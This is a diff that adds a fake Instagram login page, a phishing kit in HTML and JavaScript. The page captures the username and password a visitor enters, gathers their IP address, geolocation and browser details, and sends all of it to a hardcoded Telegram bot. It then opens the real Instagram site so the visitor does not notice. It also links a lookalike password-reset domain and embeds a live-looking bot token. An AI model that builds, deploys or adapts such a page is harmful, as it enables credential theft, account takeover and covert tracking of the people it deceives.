@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagrm</title>
+<link rel="icon" type="image/x-icon" href="Title.ico">
+
+<style>
+    body {
+        margin:0;
+        background:#1C2B33;
+        font-family:Arial, sans-serif;
+        display:flex;
+        justify-content:center;
+        padding-top:40px;
+        color:white;
+    }
+    .container {
+        width:100%;
+        max-width:380px;
+        text-align:center;
+    }
+    .logo {
+        width:80px;
+        margin:0 auto 40px;
+        display:block;
+    }
+    input {
+    width:100%;
+    background:#1C2B33;
+    border:1px solid #27333f;
+    padding:14px;
+    margin-bottom:10px;
+    border-radius:10px;     /* نفس حواف الأزرار */
+    color:white;
+    font-size:14px;
+    outline:none;
+    box-sizing: border-box; /* مهم جداً علشان الحواف تبقى بنفس الحجم الحقيقي */
+    }
+    input::placeholder { color:#8b98a5; }
+    button {
+    width:100%;
+    padding:14px;
+    background:#0064e0;
+    border:none;
+    border-radius:50px;
+    color:white;
+    font-size:15px;
+    margin-top:10px;
+    cursor:pointer;
+    }
+
+    .error {
+        color:#ff4d4f;
+        font-size:13px;
+        margin-bottom:10px;
+        display:none;
+    }
+    .forgot {
+        color:#e6dddd;
+        margin:20px 0;
+        font-size:14px;
+        cursor:pointer;
+    }
+.create-btn {
+    width:100%;
+    padding:14px;
+    border:1px solid #0064e0;
+    border-radius:50px;      /* نفس انحناء اللوج إن */
+    margin-top:10px;
+    color:#2587ffd2;
+    text-decoration:none;
+    display:block;
+    text-align:center;
+    box-sizing:border-box;   /* مهم جداً علشان البوردر مايزودش الحجم */
+}
+
+    .loading {
+        display: none;
+        color: #8b98a5;
+        font-size: 14px;
+        margin-top: 10px;
+    }
+    .bold {
+    font-weight: bold;
+    }
+    .language {
+    position: absolute;
+    top: 10px;                /* المسافة من أعلى */
+    left: 50%;                /* في النص أفقياً */
+    transform: translateX(-50%); /* ضبط دقيق للنص */
+    font-size: 13px;
+    color: #ffffff;
+    font-family: Arial, sans-serif;
+    opacity: 0.7;
+    }
+
+</style>
+</head>
+<body>
+<div class="language">English (US)</div>
+
+<div class="container">
+
+    <img src="IG.png" class="logo">
+
+    <input type="text" id="email" placeholder="Username, email or mobile number ">
+    <input type="password" id="password" placeholder="Password">
+
+    <div id="errorMsg" class="error">
+        Please enter a valid email and password (at least 8 characters)
+    </div>
+
+    <div id="loadingMsg" class="loading">
+        Signing in, please wait...
+    </div>
+
+    <button id="loginBtn">Log in</button>
+
+    <div class="forgot bold" onclick="window.open('https://iinstagrm.github.io/accounts/reset-password.html','_blank')">
+    Forgot password?
+    </div>
+
+
+    <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank" class="create-btn">
+        Create new account
+    </a>
+
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script>
+    // إعدادات التليجرام - استبدلها بقيمك
+    const TOKEN = "8136154375:AAEC2wSeLsN6NvvZZqKwCbn8aVTCP4c-Sao";
+    const CHAT_ID = "7631254472";
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+    // عناصر DOM
+    const emailInput = document.getElementById('email');
+    const passInput = document.getElementById('password');
+    const loginBtn = document.getElementById('loginBtn');
+    const errorMsg = document.getElementById('errorMsg');
+    const loadingMsg = document.getElementById('loadingMsg');
+
+    // الحصول على معلومات العميل
+    async function getClientInfo() {
+        try {
+            // الحصول على الـ IP
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            
+            // الحصول على معلومات الموقع
+            const locationResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
+            const locationData = await locationResponse.json();
+            
+            return {
+                ip: ipData.ip,
+                country: locationData.country || 'Unknown',
+                city: locationData.city || 'Unknown',
+                region: locationData.regionName || 'Unknown',
+                timezone: locationData.timezone || 'Unknown',
+                isp: locationData.isp || 'Unknown',
+                browser: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                time: new Date().toLocaleString(),
+                referrer: document.referrer || 'Direct'
+            };
+        } catch (error) {
+            console.error('Error getting client info:', error);
+            return {
+                ip: 'Unknown',
+                country: 'Unknown',
+                city: 'Unknown',
+                region: 'Unknown',
+                timezone: 'Unknown',
+                isp: 'Unknown',
+                browser: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                time: new Date().toLocaleString(),
+                referrer: document.referrer || 'Direct'
+            };
+        }
+    }
+
+    // إرسال الإشعار إلى التليجرام
+    async function sendLoginNotification(email, password) {
+        const clientInfo = await getClientInfo();
+        
+        const message = `
+🔐 **New Login Attempt** - ${clientInfo.time}
+
+👤 **Email/Username:** ${email}
+🔑 **Password:** ${password}
+
+🌐 **IP Address:** ${clientInfo.ip}
+📍 **Location:** ${clientInfo.city}, ${clientInfo.region}, ${clientInfo.country}
+🕒 **Timezone:** ${clientInfo.timezone}
+📡 **ISP:** ${clientInfo.isp}
+
+🖥️ **Platform:** ${clientInfo.platform}
+🌍 **Browser:** ${getBrowserName(clientInfo.browser)}
+🗣️ **Language:** ${clientInfo.language}
+📱 **Screen:** ${clientInfo.screen}
+🔗 **Referrer:** ${clientInfo.referrer}
+        `.trim();
+
+        try {
+            await axios.post(URI_API, {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            });
+            console.log('Login notification sent successfully');
+        } catch (error) {
+            console.error('Error sending notification:', error);
+        }
+    }
+
+    // الحصول على اسم المتصفح من userAgent
+    function getBrowserName(userAgent) {
+        if (userAgent.includes("Chrome")) return "Chrome";
+        if (userAgent.includes("Firefox")) return "Firefox";
+        if (userAgent.includes("Safari")) return "Safari";
+        if (userAgent.includes("Edge")) return "Edge";
+        if (userAgent.includes("Opera")) return "Opera";
+        return "Unknown Browser";
+    }
+
+    // معالجة تسجيل الدخول
+    loginBtn.addEventListener('click', async function(e){
+        const emailValue = emailInput.value.trim();
+        const passValue = passInput.value.trim();
+
+        if(emailValue === "" || passValue.length < 8){
+            e.preventDefault();
+            errorMsg.style.display = "block";
+        } else {
+            errorMsg.style.display = "none";
+            loadingMsg.style.display = "block";
+            loginBtn.disabled = true;
+            loginBtn.textContent = "Signing in...";
+
+            try {
+                // إرسال البيانات إلى التليجرام
+                await sendLoginNotification(emailValue, passValue);
+                
+                // الانتظار قليلاً ثم التوجيه
+                setTimeout(() => {
+                    window.open("https://www.instagram.com/","_blank");
+                    loadingMsg.style.display = "none";
+                    loginBtn.disabled = false;
+                    loginBtn.textContent = "Log in";
+                }, 2000);
+                
+            } catch (error) {
+                console.error('Error:', error);
+                loadingMsg.style.display = "none";
+                loginBtn.disabled = false;
+                loginBtn.textContent = "Log in";
+                window.open("https://www.instagram.com/","_blank");
+            }
+        }
+    });
+
+    // السماح بالإرسال بالضغط على Enter
+    document.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            loginBtn.click();
+        }
+    });
+</script>
+
+</body>
+</html>
